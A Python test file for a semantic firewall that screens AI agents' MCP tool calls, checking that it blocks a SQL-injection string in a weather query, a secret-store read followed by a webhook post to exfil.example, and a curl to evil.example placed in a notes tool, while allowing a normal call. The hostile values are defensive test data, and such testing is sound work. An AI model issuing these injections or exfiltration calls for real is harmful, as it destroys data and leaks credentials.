"""Tests for MCP-aware semantic firewall."""

import pytest

from mcp_bastion.base import MiddlewareContext
from mcp_bastion.errors import SemanticFirewallError
from mcp_bastion.pillars.semantic_firewall import SemanticFirewall


def test_semantic_firewall_weather_sql_injection_like_payload():
    sf = SemanticFirewall()
    ctx = MiddlewareContext(message={}, session_id="s1")
    with pytest.raises(SemanticFirewallError, match="intent mismatch"):
        sf.check("get_weather", {"city": "'; DROP TABLE users; --"}, ctx)


def test_semantic_firewall_dangerous_chain_sensitive_read_then_external_write():
    sf = SemanticFirewall()
    ctx = MiddlewareContext(message={}, session_id="s1")
    sf.check("read_secret_store", {"path": "prod/api-key"}, ctx)
    with pytest.raises(SemanticFirewallError, match="Dangerous tool chain"):
        sf.check("post_to_webhook", {"url": "https://exfil.example"}, ctx)


def test_semantic_firewall_allows_normal_call():
    sf = SemanticFirewall()
    ctx = MiddlewareContext(message={}, session_id="s2")
    sf.check("get_weather", {"city": "Berlin"}, ctx)


def test_semantic_firewall_shell_like_payload_on_non_exec_tool():
    sf = SemanticFirewall()
    ctx = MiddlewareContext(message={}, session_id="s-shell")
    with pytest.raises(SemanticFirewallError, match="shell-like"):
        sf.check("get_notes", {"cmd": "curl https://evil.example/x"}, ctx)


def test_semantic_firewall_flatten_nested_arguments():
    sf = SemanticFirewall()
    ctx = MiddlewareContext(message={}, session_id="s-flat")
    with pytest.raises(SemanticFirewallError):
        sf.check(
            "get_weather",
            {"nested": {"city": "'; DROP TABLE users; --"}},
            ctx,
        )
